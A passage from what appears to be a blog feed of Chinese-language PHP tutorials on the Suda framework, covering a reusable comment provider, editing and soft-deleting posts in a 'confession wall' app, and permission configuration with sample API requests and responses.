class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">comments</span>\<span class="title">provider</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">comments</span>\<span class="title">controller</span>\<span class="title">CommentController</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 评论</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommentProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">protected</span> $commentTable;</span><br><span class="line">    <span class="keyword">protected</span> $subCommentTable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;controller =  <span class="keyword">new</span> CommentController($name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $target</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(int $target, string $content)</span>:<span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;controller-&gt;add($target, $content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 评论评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $comment</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">comment</span><span class="params">(int $comment, string $content)</span>:<span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;controller-&gt;comment($comment, $content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 回复子评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $subcommet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reply</span><span class="params">(int $subcommet, string $content)</span>:<span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;controller-&gt;reply($subcommet, $content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取目标评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $target</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer|null $page</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $row</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getComment</span><span class="params">(int $target, ?int $page=null, int $row=<span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $comments = <span class="keyword">$this</span>-&gt;controller-&gt;getComment($target, $page, $row);</span><br><span class="line">        $rows = $comments[<span class="string">'rows'</span>];</span><br><span class="line">        $ids = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($rows <span class="keyword">as</span> $index =&gt; $row) &#123;</span><br><span class="line">            $ids[] = $row[<span class="string">'user'</span>];</span><br><span class="line">            <span class="keyword">unset</span>($row[<span class="string">'ip'</span>]);</span><br><span class="line">            $rows[$index] = $row;</span><br><span class="line">        &#125;</span><br><span class="line">        $userInfos = get_user_public_info_array($ids);</span><br><span class="line">        <span class="keyword">foreach</span> ($rows <span class="keyword">as</span> $index =&gt; $row) &#123;</span><br><span class="line">           $rows[$index][<span class="string">'user'</span>] = $userInfos[$row[<span class="string">'user'</span>]] ?? $row[<span class="string">'user'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        $comments[<span class="string">'rows'</span>] = $rows;</span><br><span class="line">        <span class="keyword">return</span> $comments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取评论的评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $comment</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer|null $page</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $row</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSubComment</span><span class="params">(int $comment, ?int $page=null, int $row=<span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $comments = <span class="keyword">$this</span>-&gt;controller-&gt;getSubComment($comment, $page, $row);</span><br><span class="line">        $rows = $comments[<span class="string">'rows'</span>];</span><br><span class="line">        $ids = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($rows <span class="keyword">as</span> $index =&gt; $row) &#123;</span><br><span class="line">            $ids[] = $row[<span class="string">'user'</span>];</span><br><span class="line">            <span class="keyword">unset</span>($row[<span class="string">'ip'</span>]);</span><br><span class="line">            $rows[$index] = $row;</span><br><span class="line">        &#125;</span><br><span class="line">        $userInfos = get_user_public_info_array($ids);</span><br><span class="line">        <span class="keyword">foreach</span> ($rows <span class="keyword">as</span> $index =&gt; $row) &#123;</span><br><span class="line">            $rows[$index][<span class="string">'user'</span>] = $userInfos[$row[<span class="string">'user'</span>]] ?? $row[<span class="string">'user'</span>];</span><br><span class="line">            $rows[$index][<span class="string">'reply'</span>] = $userInfos[$row[<span class="string">'reply'</span>]] ?? $row[<span class="string">'reply'</span>];</span><br><span class="line">         &#125;</span><br><span class="line">        $comments[<span class="string">'rows'</span>] = $rows;</span><br><span class="line">        <span class="keyword">return</span> $comments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除特定评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $comment</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> boolean $sub</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">(int $comment, bool $sub = false)</span>:<span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;controller-&gt;delete($comment, $sub);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在模块的状态结构如下：</p><p><img src="2.png" alt=""></p><h2 id="在模块中引用"><a href="#在模块中引用" class="headerlink" title="在模块中引用"></a>在模块中引用</h2><p>我们在模块的 <code>api/mapper</code> 类中引用的是Provider，现在我们的构造函数带了参数，怎么调用？</p><p><strong>confession-wall 模块调用</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">v1.0:</span></span><br><span class="line"><span class="attr">  confession-wall:</span> <span class="string">dxkite.confession.wall.provider.ConfessionProvider</span></span><br><span class="line"><span class="attr">  confession-wall-comment:</span> <span class="string">dxkite.comments.provider.CommentProvider(confession-wall)</span></span><br><span class="line"><span class="attr">  confession-wall-setting:</span> <span class="string">dxkite.confession.wall.provider.ConfessionSettingProvider</span></span><br></pre></td></tr></table></figure><p>按照正常思路给他参数就行（不用引号，所有输入参数以<code>,</code>分割）。如果参数比较奇怪（包含<code>)</code>或者<code>,</code>），还支持使用json提交参数数组，不过需要一次base64编码：</p><p><code>dxkite.comments.provider.CommentProvider(=json::WzEsIjIiXQ)</code></p><p>先在我们看看我们的API开放接口：</p><p><img src="3.png" alt=""></p><p>我们可以正常使用这个API，以后其他模块需要这个评论接口，就看可以加一行配置，换一下表后缀就可以了（<strong>注意激活模块</strong>）</p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ul><li>创建好模块 <a href="dxkite-comments.8.27.mod">下载</a></li><li>在表白墙中引用</li></ul>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
            <tag> 通用评论 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 17 表白墙基本业务操作 - 表白管理：编辑删除</title>
      <link href="/2018/08/26/suda-confession-wall-setting-edit-delete/"/>
      <url>/2018/08/26/suda-confession-wall-setting-edit-delete/</url>
      <content type="html"><![CDATA[<p>前面我们讲了列出表白的内容，这次我们讲如何编辑以及删除，在框架的模式下，对数据表的<code>CRUD</code>非常的简单，特别是你按照自己的套路来写的时候那就更加的简单了。</p><a id="more"></a><h2 id="编辑功能"><a href="#编辑功能" class="headerlink" title="编辑功能"></a>编辑功能</h2><p>管理员编辑表白的内容，现有的情况下可以编辑标题、内容，编辑的方式当然还是通过表白的id来编辑嘛，首先我们的表白内容编辑得有个权限：<code>confession-wall.edit</code>，那么在 <code>ConfessionSettingProvider</code> 类中映射出的函数的声明如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编辑内容</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@acl</span> confession-wall.edit</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> integer $id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span><span class="params">(int $id,array $value)</span>:<span class="title">bool</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于操作十分原始，我们这里就不再在Controller中加入编辑的方法了（想加还是可以加），我们直接引入数据表来操作，操作的时候对输入进行处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编辑内容</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@acl</span> confession-wall.edit</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> integer $id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span><span class="params">(int $id, array $value)</span>:<span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $table = <span class="keyword">new</span> ConfessionTable;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="string">'title'</span>, $value)) &#123;</span><br><span class="line">        $sets[<span class="string">'title'</span>]=$value[<span class="string">'title'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="string">'content'</span>, $value)) &#123;</span><br><span class="line">        $sets[<span class="string">'content'</span>]=$value[<span class="string">'content'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $table-&gt;updateByPrimaryKey($id,$sets) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>发送包：<code>dev.php/api/v1.0/confession-wall-setting</code><br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"method"</span>:<span class="string">"edit"</span>,</span><br><span class="line"><span class="attr">"params"</span>: [<span class="number">1</span>,&#123;<span class="attr">"content"</span>:<span class="string">"DXkite-Updata"</span>,<span class="attr">"title"</span>:<span class="string">"Title Updated"</span>&#125;],</span><br><span class="line"><span class="attr">"id"</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>返回值：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"id"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="1.png" alt=""></p><p>查询一下：</p><p><img src="2.png" alt=""></p><h2 id="删除功能"><a href="#删除功能" class="headerlink" title="删除功能"></a>删除功能</h2><p><strong>删除不是删除，是将内容置为了删除标识：Why?</strong></p><blockquote><p>采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；<br>《中华人民共和国网络安全法》第三章网络运行安全第二十一条第三点</p></blockquote><p><em>其实也没啥，就是相当于回收站的作用</em></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@acl</span> confession-wall.delete</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> integer $id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">(int $id)</span>:<span class="title">bool</span> </span>&#123;</span><br><span class="line">    $table = <span class="keyword">new</span> ConfessionTable;</span><br><span class="line">    <span class="keyword">return</span> $table-&gt;updateByPrimaryKey($id,[<span class="string">'status'</span> =&gt; ConfessionTable::STATUS_DELETE ]) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>发送包：<code>dev.php/api/v1.0/confession-wall-setting</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"method"</span>:<span class="string">"delete"</span>,</span><br><span class="line"><span class="attr">"params"</span>: [<span class="number">1</span>],</span><br><span class="line"><span class="attr">"id"</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"id"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ul><li>复现</li></ul>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
            <tag> 表白墙 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 16 表白墙基本业务操作 - 表白管理</title>
      <link href="/2018/08/25/suda-confession-wall-setting/"/>
      <url>/2018/08/25/suda-confession-wall-setting/</url>
      <content type="html"><![CDATA[<p>我们基本的功能写的差不多了（什么！就差不多了？？？），现在我们需要添加一个管理功能。</p><a id="more"></a><h2 id="管理权限"><a href="#管理权限" class="headerlink" title="管理权限"></a>管理权限</h2><p><code>Support</code> 模块提供了细粒度的权限管理功能，我们来学习一下如何使用：</p><h3 id="添加权限列"><a href="#添加权限列" class="headerlink" title="添加权限列"></a>添加权限列</h3><p>我们在 <code>config</code> 目录下添加一个 <code>permissions</code> 配置，如果你用json做配置文件可以这样写：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"confession-wall"</span>: &#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"表白墙权限管理"</span>,</span><br><span class="line">    <span class="attr">"childs"</span>: &#123;</span><br><span class="line">      <span class="attr">"view"</span>: <span class="string">"查看表白列表"</span>,</span><br><span class="line">      <span class="attr">"status"</span>: <span class="string">"编辑列表状态"</span>,</span><br><span class="line">      <span class="attr">"edit"</span>: <span class="string">"编辑表白"</span>,</span><br><span class="line">      <span class="attr">"delete"</span>: <span class="string">"删除表白"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过我们现在采用 yaml 做配置文件。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">confession-wall:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">表白墙权限管理</span></span><br><span class="line"><span class="attr">  childs:</span></span><br><span class="line"><span class="attr">    view:</span> <span class="string">查看表白列表</span></span><br><span class="line"><span class="attr">    status:</span> <span class="string">编辑列表状态</span></span><br><span class="line"><span class="attr">    edit:</span> <span class="string">编辑表白</span></span><br><span class="line"><span class="attr">    delete:</span> <span class="string">删除表白</span></span><br></pre></td></tr></table></figure><h3 id="添加权限角色"><a href="#添加权限角色" class="headerlink" title="添加权限角色"></a>添加权限角色</h3><p>进入后台设置列表：</p><p><img src="1.png" alt=""></p><p>这里我们权限添加一个角色：</p><p><img src="2.png" alt=""></p><p>然后给自己添加一下权限（设置-&gt;用户列表-&gt;权限）：</p><p><img src="3.png" alt=""></p><p>然后我们现在权限已经加好了。</p><h2 id="添加管理功能"><a href="#添加管理功能" class="headerlink" title="添加管理功能"></a>添加管理功能</h2><p>管理功能我们单独使用一个 <code>Provider</code>：</p><h3 id="查看表白列表"><a href="#查看表白列表" class="headerlink" title="查看表白列表"></a>查看表白列表</h3><p>查看列表，这里我们添加一个 Doc 注释，加一个 <code>@acl</code> 标注，值为 <code>confession-wall.view</code> （刚刚加入的权限配置的权限之一）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 列出表白墙列表</span><br><span class="line"> * </span><br><span class="line"> * @acl confession-wall.view</span><br><span class="line"> * @param integer|null $page</span><br><span class="line"> * @param integer $row</span><br><span class="line"> * @return array|null</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><p>这里是仿造Java的Annotation注解的功能</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">provider</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">controller</span>\<span class="title">ConfessionController</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 管理表白</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfessionSettingProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $controller;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;controller = <span class="keyword">new</span> ConfessionController;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 列出表白墙列表</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@acl</span> confession-wall.view</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer|null $page</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $row</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span><span class="params">(?int $page, int $row = <span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pageData = <span class="keyword">$this</span>-&gt;controller-&gt;list($page, $row);</span><br><span class="line">        $pageRows = $pageData[<span class="string">'rows'</span>]; <span class="comment">// 获取到数据字段</span></span><br><span class="line">        <span class="comment">// 检测到需要处理的用户ID</span></span><br><span class="line">        $userIdMap = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($pageRows <span class="keyword">as</span> $index =&gt; $pageRow) &#123;</span><br><span class="line">            $userIdMap[$pageRow[<span class="string">'user'</span>]][]=$index;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取所有用户信息</span></span><br><span class="line">        $userInfos = get_user_public_info_array(array_keys($userIdMap));</span><br><span class="line">        <span class="comment">// 返回到数据列</span></span><br><span class="line">        <span class="keyword">foreach</span> ($userInfos <span class="keyword">as</span> $id =&gt; $data) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($userIdMap[$id] <span class="keyword">as</span> $index) &#123;</span><br><span class="line">                $pageRows[$index][<span class="string">'user'</span>]=$data;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 放回原来的字段</span></span><br><span class="line">        $pageData[<span class="string">'rows'</span>] = $pageRows;</span><br><span class="line">        <span class="keyword">return</span> $pageData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我来把 <code>ConfessionSettingProvider</code> 映射到API接口列表中：<br>打开 <code>api/mapper</code> 文件（这里是 <code>api/mapper.yml</code>）</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">v1.0:</span></span><br><span class="line"><span class="attr">  confession-wall:</span> <span class="string">dxkite.confession.wall.provider.ConfessionProvider</span></span><br><span class="line"><span class="attr">  confession-wall-setting:</span> <span class="string">dxkite.confession.wall.provider.ConfessionSettingProvider</span></span><br></pre></td></tr></table></figure><p>然后访问：<code>dev.php/api/v1.0</code></p><p><img src="4.png" alt=""></p><p>可以看到 <code>confession-wall-setting</code> 也注册到API中</p><p><img src="5.png" alt=""></p><p>我们来使用一下这个功能</p><p><img src="/images/placeholder.png" alt="" data-src="6.png" class="lazyload"></p><p>哎？<code>PermissionDeny</code> 没有权限哦，为啥，，，没登陆啊。赶紧登陆一个</p><p><img src="/images/placeholder.png" alt="" data-src="7.png" class="lazyload"></p><p>登陆后，就可以查看到了我们的权限：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"rows"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span 